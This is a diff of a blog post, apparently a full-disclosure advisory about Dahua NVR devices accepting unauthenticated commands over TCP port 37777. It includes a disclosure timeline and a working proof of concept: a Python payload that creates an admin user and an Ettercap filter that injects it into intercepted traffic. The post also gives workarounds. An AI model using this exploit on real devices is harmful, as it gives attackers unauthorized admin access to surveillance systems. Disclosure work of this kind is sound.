@@ -16,7 +16,7 @@ I decided to try to inject a new user into the system by modifying packets in th
 - 2017-03-02: Dahua Contacted with plan to disclose on March 9th unless they wished otherwise.
 - 2017-03-07: Dahua Responded with timeline to fix CVE-2017-6341, CVE-2017-6342, CVE-2017-6343
 - 2017-03-07: Requested response for this: CVE-2017-6432 again
-- 2017-03-09: Disclosure
+- 2017-03-09: Full Disclosure
 
 ### The Hardware and Software
 
@@ -41,7 +41,6 @@ The Proof of Concept has been performed using Ettercap, an Ettercap Filter, and 
 
 ### Proof of Concept
 
-This ettercap filter was the original Proof of Concept.
 
 First, we need to generate the packet for a new user.
 ```python
@@ -54,27 +53,59 @@ payload = "\xa6\x00\x00\x00" + length + "\x00\x00\x00\x06" + "\x00"*23 + content
 The :1:1::1 following the username and password is the groups and permissions, this is a basic account with admin rights, which can only modify configuration.  Whatever permissions and groups that are wanted, simply replace that.  
 The 0: at the start is the user id.  A 0 causes the NVR to automatically assign the next free user ID to the new user.
 
-In order to get the payload in a usable format, I simply used scapy to generate the packet, and took the payload.
-![img]({{ site.github.url }}/images/Screen Shot 2017-03-09 at 9.10.54 pm.png){:class="img-responsive"}
+
+![img]({{ site.github.url }}/images/Screen Shot 2017-03-09 at 10.17.05 pm.png){:class="img-responsive"}
 
 
 Now that we have our content, the following ettercap filter is used.
-What is packtet I'm replaceing, honestly, I don't care, and it doesn't matter what you replace, as soon as it gets the packet it expects, it works.
+What the packtet is I am detecting doesn't matter, as I am actually going to tack my payload (which is normally a full packet) straight onto the end of the original packet, and it will work just fine!  
 
 ```
 if (ip.proto == TCP && tcp.dst == 37777 && DATA.data + 0 == "\xa4" && DATA.data + 8 == "\x1a" ){
     msg("Found One");
-    log(DATA.data, "/tmp/data.l");
-    replace("\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", "\xa6\x00\x00\x00\x11\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000:null:ku7:1:1::1");
-    log(DATA.data, "/tmp/data.l");
-    msg("Done");
+    inject("/root/etter/newuser.packet");
+    exit();
 }
 ```
+![img]({{ site.github.url }}/images/Screen Shot 2017-03-09 at 10.05.25 pm.png){:class="img-responsive"}
 
-So here you can see, based upon the hexdump of the log, that the filter captured the packet as we asked, and replaced it with the packet we wanted.  It did this twice, and that did not cause any unexpected behaviour, only 1 account was created.
+Now, Load this up into ettercap, do our magic, and have a peek at what happens
+
+I hear you... That packet will be the wrong size, checksum won't match, the world will fall over.
+You should drop or replace contents.  
+
+![img]({{ site.github.url }}/images/Screen Shot 2017-03-09 at 10.25.37 pm.png){:class="img-responsive"}
+
+Yes, I should have to do something better than this... but I don't!
+
+![img]({{ site.github.url }}/images/Screen Shot 2017-03-09 at 10.27.29 pm.png){:class="img-responsive"}
+
+Originally I did so this by replacing the packet contents, as well as other ways.  As long as you inject into the stream, it will work
+
 ![img]({{ site.github.url }}/images/Screen Shot 2017-03-02 at 12.51.14 am.png){:class="img-responsive"}
 
-And here is our new account as seen in the Desktop Software.
-![img]({{ site.github.url }}/images/Screen Shot 2017-03-02 at 12.52.38 am.png){:class="img-responsive"}
+
+### Additional Notes
+
+While this proof of concept is only for injecting a user, it could be used for much more.
 
 
+### Workarounds
+
+There are none, this is insecure by design.  
+Until a proper encrypted protocol is used, these are vulnerable.  
+If you intend to use any Dahua equipment on an untrusted network, they should be accessed only using an encrypted tunnel of some sort.  
+
+### Vendor Response
+
+Will update this when they do.
+7 days was given for a response, while correspondance did occur, this exploit was not covered.  
+Due to the logical step from the last exposures to this one, Full Disclosure is applied.
+
+### Credits
+
+Vulnerability discovered by Andrew Frahn (null_ku7)
+
+### References
+
+CVE-2017-6341, CVE-2017-6342, CVE-2017-6343: (https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html)[https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html]
